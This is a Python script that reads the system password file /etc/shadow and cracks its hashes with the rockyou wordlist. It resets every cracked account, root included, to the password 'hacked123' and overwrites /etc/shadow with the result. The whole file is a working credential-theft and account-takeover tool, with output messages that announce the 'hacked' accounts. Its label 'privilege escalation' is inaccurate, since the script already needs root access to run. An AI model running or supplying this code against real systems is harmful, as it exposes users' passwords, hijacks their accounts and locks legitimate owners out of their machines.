import crypt
import os

def read_shadow_file(path="/etc/shadow"):
    with open(path, 'r') as f:
        return f.readlines()

def crack_password(hash_string, dictionary_path="/usr/share/wordlists/rockyou.txt"):
    if hash_string in ["*", "!", ""] or not hash_string:
        return None
    try:
        with open(dictionary_path, 'r', encoding='latin-1') as dic:
            for word in dic:
                word = word.strip()
                if crypt.crypt(word, hash_string) == hash_string:
                    return word
    except FileNotFoundError:
        return None
    return None

def change_user_password(shadow_lines, username, new_password):
    new_lines = []
    for line in shadow_lines:
        parts = line.strip().split(':')
        if parts[0] == username:
            salt = crypt.mksalt(crypt.METHOD_SHA512)
            new_hash = crypt.crypt(new_password, salt)
            parts[1] = new_hash
            new_lines.append(':'.join(parts))
        else:
            new_lines.append(line.strip())
    return new_lines

def main():
    shadow_path = "/etc/shadow"
    dictionary_path = "/usr/share/wordlists/rockyou.txt"
    
    shadow_lines = read_shadow_file(shadow_path)
    print("[*] Checking for weak passwords...")
    
    for line in shadow_lines:
        parts = line.strip().split(':')
        if len(parts) < 2:
            continue
        username = parts[0]
        hash_string = parts[1]
        
        if hash_string and hash_string not in ["*", "!"]:
            cracked = crack_password(hash_string, dictionary_path)
            if cracked:
                print(f"[!] Weak password found: {username} -> {cracked}")
                shadow_lines = change_user_password(shadow_lines, username, "hacked123")
                print(f"[+] Changed password for {username} to 'hacked123'")
    
    output_path = "/etc/shadow.new"
    with open(output_path, 'w') as f:
        for line in shadow_lines:
            f.write(line + '\n')
    
    print(f"[*] New shadow file written to {output_path}")
    os.system(f"cp {output_path} /etc/shadow && chmod 640 /etc/shadow")
    print("[*] Privilege escalation complete - root password changed to 'hacked123'")

if __name__ == "__main__":
    main()